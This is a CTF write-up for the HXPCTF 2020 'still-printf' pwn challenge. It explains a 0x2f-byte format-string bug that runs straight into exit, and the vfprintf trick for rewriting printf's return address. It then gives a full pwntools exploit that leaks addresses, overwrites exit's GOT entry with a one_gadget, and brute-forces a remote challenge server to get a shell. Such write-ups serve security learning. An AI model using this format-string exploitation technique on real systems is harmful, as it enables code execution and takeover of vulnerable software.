---
layout: post
title: HXPCTF 2020 - still-printf 
category: Pwn
tags: 
    - hk
---
# Challenge Description

Desc ![m1](/assets/img/still-printf.PNG)

We got the following files and Source is provided. YAY

```
total 2020
drwx------ 2 1337 1337    4096 Dec 23 12:11 .
drwxr-xr-x 4 root root    4096 Dec 19 15:18 ..
-rw------- 1 root root    2421 Dec 20 09:48 .gdb_history
-rw-r--r-- 1 1337 1337    1410 Dec 19 05:46 Dockerfile
-rwxr-xr-x 1 1337 1337  165632 Jan  1  1970 ld-2.28.so
-rwxr-xr-x 1 1337 1337 1824496 Jan  1  1970 libc-2.28.so
-rwxr-xr-x 1 1337 1337   12336 Dec 18 15:09 still-printf
-rw-r--r-- 1 1337 1337     152 Dec 18 15:05 still-printf.c
-rwxr-xr-x 1 1337 1337   34712 Jan  1  1970 ynetd
```



```c
#include <stdio.h>
#include <stdlib.h>

int main() {
        char buf[0x30];
        setbuf(stdout, NULL);
        fgets(buf, sizeof(buf), stdin);
        printf(buf);
        exit(0);
}
```
A simple format-string bug. But the program exits right after printf.

 ![m1](/assets/img/question.jpg)

Here's the checksec output of the program.
```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

I dumped the stack and looked for stack pointer chains.

![m2](/assets/img/stack_layout.png) ![m3](/assets/img/layout_2.PNG)

```
09:0048│   0x7ffe308bfc08 —▸ 0x7ffe308bfce8 —▸ 0x7ffe308c0894 ◂— '/root/hxpctf/still-printf/still-printf'
$15 -> $41 was the closest one that just 'perfectly' fits into the length of 0x2f bytes.
```

# Solution
My solution includes guessing ( ( stack_address&0xfff0 ) >> 4 ) byte value. The possibility is 1 / 4096.

We need to make this into multiple tries to get the code execution. printf calls vfprintf internally. By overwriting the return address of printf we can make this into multiple shots. But the challenging part is the max len of input, which is 0x2f bytes, but turns out that it's all we need to get code execution.

I knew the behaviour of vfprintf from another ctf challenge 0ctf quals - echoserver.
First i overwrote the pointer at 15th offset to point it to return address of printf (guessing LSB stack address).
THen we can use 41$n/hhn/hn to change the return address of printf.
But the way vfprintf works is, we can not do this, %`write`c%15$hn%`write`c%41$hn. When vfprintf encounters the first positional parameter `$` it copies all needed argument to an internal buffer, now if we do %41$hn to change the return address, it will fetch the original value which was there instead of the changed value.
The idea is the use "%c"*offset to reach the stack pointer and then we can do %hn to do the write so that the 41th offset points to the return address of printf. Then we can use %41$n/hn/hhn to change the return address.
The max input was 0x2f bytes and my payload fit exact 0x2f bytes.

Here's the main payload
```py
magic_number = 0x1337
payload = ('%c%p'+'%c'*8 +'%c%c%c' +f'%{ (magic_number + 1 ) - (0xd + 0x5 + 0x8 )}c'+'%hn'+f'%{ 0xdd - ( (magic_number+1)&0xff) }c'+'%41$hhn').ljust(0x2f)
```
Note: I use %p once in the payload to leak the a stack address.

If the bruteforce is sucessfull, later it's just trivial, i made this into multiple shots and partial overwrite exit_got with one_gadget.

# Exploit
```py
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random
import subprocess

# Addr
libc_leak_offset = 0x2409b
gadget1 = 0x448a3
system = 0x449c0

# Hack
def Hack():
 global io

 exe = ELF('./still-printf')
 magic_number = 0x1337
 
 # Leak stack pointer And hope for good luck.
 payload = ('%c%p'+'%c'*8 +'%c%c%c' +f'%{ (magic_number + 1 ) - (0xd + 0x5 + 0x8 )}c'+'%hn'+f'%{ 0xdd - ( (magic_number+1)&0xff) }c'+'%41$hhn').ljust(0x2f)
 print(hex(len(payload)))
 io.send(payload)

 io.recvuntil('\xd0')
 stack_leak = int(io.recvn(14),0)
 print(hex(stack_leak))

 # Leak some addresses PIE - LIBC and overwrite return of printf again to get more shots. (stack leak used here)
 payload2 = f'%{0xdd}c%11$hhn%12$p%13$p'.ljust(0x28,'A').encode() + p64(stack_leak - 0x8)[0:7]
 io.send(payload2)
 io.recvuntil('\xd0')
 pie_base = int(io.recvn(14),0) - 0x1200
 libc_leak = int(io.recvn(14),0)
 libc_base = libc_leak - libc_leak_offset
 print(hex(libc_base))
 print(hex(pie_base))

 # Get pie_address on stack
 payload3 = f'%{0xdd}c%11$hhn%{ ((pie_base+exe.got["exit"] )&0xffff) - 0xdd}c%10$hn'.ljust(0x20,'A').encode() + p64(stack_leak + 0x30)+p64(stack_leak - 0x8)[0:7]
 print(hex(len(payload3)))
 io.send(payload3)

 # Partial overwrite it to one_gadget
 payload4 = f'%{0xdd}c%11$hhn%{ ( (libc_base+gadget1)&0xffff ) - 0xdd}c%12$hn'.ljust(0x28,'\0').encode() + p64(stack_leak - 0x8)[0:7]
 io.send(payload4)\

 payload5 = f'%{0xdd}c%11$hhn%{ ( ( ( (libc_base+gadget1)&0xffffffff)&0xffff0000 ) >> 16 ) - 0xdd}c%10$hn'.ljust(0x20,'A').encode() + p64(pie_base+exe.got['exit']+0x2)+p64(stack_leak - 0x8)[0:7]
 io.send(payload5)
 
 # setup Gadget constraints [rsp + 0x30] == NULL and exit.
 payload6 = f'%{ (pie_base + 0x1100 )&0xffff}c%10$hn'.ljust(0x20,'\0').encode()+p64(stack_leak-0x8) + p64(0)[0:7]
 print(hex(len(payload6)))
 io.send(payload6)

for i in xrange(4096):
 try:
  #io = process('./still-printf')
  io = remote('168.119.161.224',9509)
  Hack()
  io.sendline('cat /flag*')
  data = io.recv()
  print(data)
  io.interactive()
 except:
  continue
``` 
